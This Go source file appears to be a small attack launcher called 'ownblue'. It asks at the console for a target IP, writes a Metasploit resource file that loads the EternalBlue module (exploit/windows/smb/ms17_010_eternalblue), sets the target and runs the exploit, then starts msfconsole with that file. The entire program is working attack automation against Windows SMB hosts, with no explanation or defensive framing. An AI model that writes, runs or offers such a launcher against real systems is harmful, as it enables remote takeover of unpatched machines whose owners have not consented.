package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func ownblue(resfile string) {
	cmdname := "msfconsole"
	cmdpath, _ := exec.LookPath(cmdname)
	fmt.Println(cmdpath)
	cmdArgs := []string{"-r", resfile}

	cmdapache := exec.Command(cmdpath, cmdArgs...)
	cmdapache.Stderr = os.Stderr
	cmdapache.Stdout = os.Stdout
	cmdapache.Stdin = os.Stdin
	cmdapache.Run()
	cmdapache.Wait()
}

func createresourcefile(rhost string) {
	f, err := os.Create("ownblue.rc")
	if err != nil {
		fmt.Println(err)
	}
	defer f.Close()

	f.WriteString("use exploit/windows/smb/ms17_010_eternalblue\n")
	f.WriteString("set rhost " + rhost + "\n")
	f.WriteString("exploit\n")
}

func main() {
	getvalfromconsole := bufio.NewReader(os.Stdin)
	fmt.Printf("Blue IP : ")
	ip, _ := getvalfromconsole.ReadString('\n')
	ip = strings.Replace(ip, "\n", "", -1)
	createresourcefile(ip)
	ownblue("ownblue.rc")
}
